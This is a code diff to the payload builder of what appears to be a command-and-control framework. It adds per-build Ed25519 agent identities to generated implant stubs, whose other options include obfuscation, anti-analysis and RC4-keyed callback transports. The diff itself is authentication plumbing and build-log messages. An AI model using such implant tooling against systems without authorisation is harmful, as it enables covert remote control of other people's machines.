@@ -280,7 +280,8 @@ class PayloadBuilder:
     - Optional signing workflow
     """
 
-    def __init__(self, config: ConfigManager, audit: AuditLogger, agent_keys: Any = None):
+    def __init__(self, config: ConfigManager, audit: AuditLogger, agent_keys: Any = None,
+                 identity_store: Any = None):
         self._config = config
         self._audit = audit
         # Optional AgentKeyRegistry — when set, each built agent is minted a
@@ -288,6 +289,9 @@ class PayloadBuilder:
         # authenticate it. When None, stubs build without an identity and will
         # only connect to a legacy unsigned listener.
         self._agent_keys = agent_keys
+        # Invoked after a build mints an identity, so the caller can persist the
+        # public half; the builder has no config-write path of its own.
+        self._identity_store = identity_store
         self._artifact_dir = Path(config.get("paths.payload_artifacts", "./payloads/artifacts"))
         self._artifact_dir.mkdir(parents=True, exist_ok=True)
         self._signer = PayloadSigner(config, audit)
@@ -549,6 +553,14 @@ class PayloadBuilder:
                             f"PE built via MinGW: {pe_result.size_bytes}B, "
                             f"SHA256={pe_result.hash_sha256[:16]}..."
                         )
+                        # The C template has no signed handshake yet, so a .exe
+                        # built here cannot prove an agent identity and enrols
+                        # with the shared enrollment secret. Saying so beats
+                        # letting the operator believe the two agents are
+                        # equivalent.
+                        build_log.append(
+                            "Agent identity: not carried by the C agent — this "
+                            ".exe enrols with the shared enrollment secret")
                         # Say which wire this artifact speaks. The listener
                         # reads transports.rc4_key and the builder reads
                         # payloads.pe_rc4_key, so a mismatch is invisible from
@@ -570,6 +582,13 @@ class PayloadBuilder:
                 # Build actual agent stub (Jinja2-templated, config-injected)
                 from pupyteer.agent.core.stub import AgentStubGenerator, StubConfig
                 stub_gen = AgentStubGenerator()
+                # Minted here rather than at engine start so the key is bound to
+                # this artifact: the private half is compiled into this one
+                # payload and the public half is what the listener keeps. A
+                # registry that was never handed to the builder means no
+                # identity, and the payload enrols with the enrollment secret
+                # exactly as it did before.
+                identity = self._mint_agent_identity()
                 stub_cfg = StubConfig(
                     name=payload_config.name,
                     transport=payload_config.transport,
@@ -589,6 +608,7 @@ class PayloadBuilder:
                     anti_analysis=payload_config.anti_analysis,
                     obfuscation=payload_config.obfuscation,
                     rc4_key=payload_config.rc4_key,
+                    extra={"agent_identity": identity} if identity else {},
                 )
                 agent_code = stub_gen.generate(stub_cfg)
                 src_path = artifact_path.parent / f"{artifact_path.name}.py"
@@ -596,6 +616,16 @@ class PayloadBuilder:
                 build_log.append(
                     f"Stub generated: {payload_config.transport} -> "
                     f"{payload_config.host}:{payload_config.port}")
+                if identity:
+                    build_log.append(
+                        f"Agent identity: {identity['agent_id']} (Ed25519, "
+                        "carried by this payload only)")
+                    # Tie the artifact to the identity it was built with, so a
+                    # session that arrives can be traced back to a build rather
+                    # than to "some payload this server made".
+                    metadata.config["agent_id"] = identity["agent_id"]
+                    if self._identity_store is not None:
+                        self._identity_store()
                 if (payload_config.payload_type == PayloadType.SCRIPT
                         or payload_config.compiler == "script"):
                     artifact_path = src_path
@@ -936,11 +966,17 @@ class PayloadManager:
     - Optional signing
     """
 
-    def __init__(self, config: ConfigManager, audit: AuditLogger, agent_keys: Any = None):
+    def __init__(self, config: ConfigManager, audit: AuditLogger, agent_keys: Any = None,
+                 identity_store: Any = None):
         self._config = config
         self._audit = audit
-        self._builder = PayloadBuilder(config, audit, agent_keys=agent_keys)
+        self._builder = PayloadBuilder(config, audit, agent_keys=agent_keys,
+                                       identity_store=identity_store)
         self._store = PayloadStore(config, audit)
+        # Called after a build mints an agent identity, so the public half is
+        # written somewhere a restart can read it. Without it the identity is
+        # memory-only and the next start refuses the payload it was issued to.
+        self._identity_store = identity_store
 
     async def build(
         self,
